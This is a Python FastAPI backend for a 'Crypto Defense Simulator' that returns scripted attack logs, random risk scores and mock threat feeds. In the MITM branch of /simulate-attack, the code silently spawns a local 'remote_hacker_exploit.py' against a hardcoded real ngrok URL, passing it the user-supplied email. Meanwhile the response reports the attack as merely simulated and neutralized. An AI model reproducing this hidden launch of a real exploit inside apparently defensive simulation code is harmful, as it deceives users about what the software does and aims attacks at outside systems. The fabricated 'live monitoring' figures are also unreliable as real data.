import os
import uuid
import datetime
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import random

app = FastAPI(title="Crypto Defense Simulator")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class AttackRequest(BaseModel):
    attack_type: str
    target_wallet: str
    target_email: Optional[str] = "user@example.com"

class AttackLog(BaseModel):
    id: str
    attack_type: str
    target_wallet: str
    target_email: Optional[str]
    timestamp: str
    severity: str
    status: str
    prevention_action: str
    logs: List[str]

class LiveThreat(BaseModel):
    timestamp: str
    event: str
    target: str
    status: str
    severity: str

# In-memory database for simulation
attack_history_db = []
live_threat_feed = []
wallet_risks = {}
monitored_transaction_count = 1250 # Starting baseline

@app.get("/")
def read_root():
    return {"status": "Crypto Defense Simulator Backend API is running."}

@app.post("/simulate-attack")
def simulate_attack(req: AttackRequest):
    if req.attack_type not in ["MITM", "Session Hijacking", "Address Poisoning"]:
        raise HTTPException(status_code=400, detail="Invalid attack type")
    
    attack_id = str(uuid.uuid4())
    timestamp = datetime.datetime.now().isoformat()
    
    logs = [
        f"[*] Initializing {req.attack_type} attack simulation on wallet: {req.target_wallet}",
        f"[*] Target User Identity: {req.target_email}",
        f"[*] Scanning wallet surface area...",
        f"[+] Target identified and locked.",
    ]
    
    import subprocess
    import sys
    
    severity = "CRITICAL" if req.attack_type == "Session Hijacking" else "HIGH"
    prevention_action = ""
    status = "NEUTRALIZED"
    
    # Actually trigger the remote payload if attack is MITM
    if req.attack_type == "MITM":
        try:
            # We assume we are running from backend folder, remote script is in parent
            script_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "remote_hacker_exploit.py")
            if os.path.exists(script_path):
                # Trigger the remote script asynchronously so we don't block the API
                target = "https://b08d-14-139-120-76.ngrok-free.app"
                # Send the specific ngrok URL and the email since the app relies on it
                subprocess.Popen([sys.executable, script_path, target, "--email", req.target_email])
        except Exception as e:
            logs.append(f"[!] Warning: Failed to execute remote script: {str(e)}")
    
    if req.attack_type == "MITM":
        logs.append("[!] Intercepting transaction broadcast...")
        logs.append("[!] Modifying receiver address in payload...")
        logs.append("[SECURITY ALERT] Signature mismatch detected. Payload validation failed.")
        prevention_action = "Transaction blocked. Client forced to re-authenticate and sign new payload."
    elif req.attack_type == "Session Hijacking":
        logs.append("[!] Attempting to steal active Web3 provider session token...")
        logs.append("[!] Injecting malicious payload into session context...")
        logs.append("[SECURITY ALERT] Anomalous geographic login and session context change detected.")
        prevention_action = "Session terminated immediately. User flagged for MFA verification."
    elif req.attack_type == "Address Poisoning":
        logs.append("[!] Generating look-alike vanity address...")
        logs.append("[!] Sending 0 value transaction to target wallet to poison transaction history...")
        logs.append("[SECURITY ALERT] Phishing address pattern detected matching zero-value transfer scam.")
        prevention_action = "Poisoned address flagged in frontend UI. Warning displayed to user."

    logs.append(f"[SUCCESS] Attack simulated and neutralized.")
    logs.append(f"[ACTION] Prevention strategy deployed: {prevention_action}")
    
    # Generate risk score for wallet
    if req.target_wallet not in wallet_risks:
        wallet_risks[req.target_wallet] = 100
    wallet_risks[req.target_wallet] = max(10, wallet_risks[req.target_wallet] - random.randint(15, 30))

    attack_record = AttackLog(
        id=attack_id,
        attack_type=req.attack_type,
        target_wallet=req.target_wallet,
        target_email=req.target_email,
        timestamp=timestamp,
        severity=severity,
        status=status,
        prevention_action=prevention_action,
        logs=logs
    )
    
    attack_history_db.append(attack_record)
    
    # Push to live threat feed
    live_threat_feed.insert(0, LiveThreat(
        timestamp=datetime.datetime.now().strftime("%H:%M:%S"),
        event=f"{req.attack_type} Attempt Detected",
        target=req.target_wallet[:10] + "...",
        status="NEUTRALIZED",
        severity=severity
    ))
    
    if len(live_threat_feed) > 50:
        live_threat_feed.pop()
        
    return attack_record

@app.get("/attack-history", response_model=List[AttackLog])
def get_attack_history():
    return sorted(attack_history_db, key=lambda x: x.timestamp, reverse=True)

@app.get("/wallet-risk-score/{wallet}")
def get_wallet_risk(wallet: str):
    score = wallet_risks.get(wallet, 100) # 100 is perfectly safe
    return {"wallet": wallet, "score": score}

@app.get("/alerts")
def get_alerts():
    # Return recent alerts from history
    recent = sorted(attack_history_db, key=lambda x: x.timestamp, reverse=True)[:10]
    return recent

@app.get("/realtime-threat-feed", response_model=List[LiveThreat])
def get_live_threat_feed():
    # If feed is empty, add some mock startup events
    if not live_threat_feed:
        now = datetime.datetime.now()
        for i in range(3):
            t = (now - datetime.timedelta(minutes=i*2)).strftime("%H:%M:%S")
            live_threat_feed.append(LiveThreat(
                timestamp=t,
                event="Suspicious Request Blocked",
                target="0x729...F21",
                status="PREVENTED",
                severity="LOW"
            ))
    return live_threat_feed[:10]

@app.get("/live-monitoring-data")
def get_live_monitoring_data():
    global monitored_transaction_count
    # Simulate live blockchain traffic
    monitored_transaction_count += random.randint(5, 20)
    
    # Calculate counts from history for the "Live" feel
    now = datetime.datetime.now()
    ten_mins_ago = now - datetime.timedelta(minutes=10)
    
    recent_attacks = [a for a in attack_history_db if datetime.datetime.fromisoformat(a.timestamp) > ten_mins_ago]
    
    return {
        "timestamp": now.strftime("%H:%M:%S"),
        "monitored_tx": monitored_transaction_count,
        "suspicious_patterns": len(recent_attacks) * 2 + random.randint(0, 3),
        "neutralized_threats": len(attack_history_db),
        "active_monitors": 3 + (1 if random.random() > 0.8 else 0)
    }

@app.get("/threat-summary")
def get_threat_summary():
    # Aggregated stats for dashboard cards
    types = ["MITM", "Session Hijacking", "Address Poisoning"]
    summary = {t: len([a for a in attack_history_db if a.attack_type == t]) for t in types}
    return {
        "total_neutralized": len(attack_history_db),
        "by_type": summary,
        "system_health": "OPTIMAL" if len(attack_history_db) < 50 else "WARNING",
        "last_updated": datetime.datetime.now().isoformat()
    }

@app.get("/detection-status")
def get_detection_status():
    return {
        "status": "OPTIMAL",
        "active_monitors": 3,
        "threats_neutralized": len(attack_history_db),
        "system_health": "100%",
        "live_monitors": ["Etherscan API", "PhishFort DB", "Mempool Scanner"]
    }
